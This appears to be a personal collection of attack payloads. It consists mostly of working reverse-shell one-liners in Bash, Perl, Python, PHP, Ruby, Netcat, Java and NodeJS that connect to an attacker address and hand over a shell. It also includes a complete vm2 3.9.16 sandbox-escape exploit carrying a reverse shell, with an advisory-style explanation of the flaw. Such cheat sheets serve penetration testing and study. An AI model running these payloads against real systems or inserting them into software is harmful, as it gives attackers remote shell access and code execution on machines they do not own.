# Payload
A collection of payloads [I've used in the past]

# Reverse Shell Methods

Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
```

Perl
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

NodeJS
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Sandbox Escape in vm2@3.9.16 [https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 , https://github.com/advisories/GHSA-xj72-wvfv-8985]
```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
(function(){
        var net = c.constructor('return process')().mainModule.require('net'),
            cp = c.constructor('return process')().mainModule.require('child_process'),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        var IP = "10.10.14.97";
        client.connect(8888, IP, function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /0/;
    })();
}
`

console.log(vm.run(code));
```

### Analysis

As host exceptions may leak host objects into the sandbox, code is preprocessed with transformer() in order to instrument the code with handleException() sanitizer function calls. For CatchClause with ObjectPattern the code calls handleException() and then re-throws the sanitized exception inside a nested try-catch. (lib/transformer.js:121) handleException() function is an alias of thisEnsureThis(), which in turn calls thisReflectGetPrototypeOf(other) (again, an alias of Reflect.getPrototypeOf()) to access the object's prototype (lib/bridge.js:835). However, this may be proxied through a getPrototypeOf() proxy handler which can by itself throw an unsanitized host exception, resulting in the outer catch statement receiving it.
An attacker may use any method to raise a non-proxied host exception (test/vm.js:1082 for example) inside a getPrototypeOf() proxy handler, register it to an object and throw it to leak host exception, and finally use it to access host Function, escaping the sandbox.

### Impact
Remote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.



## References
* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
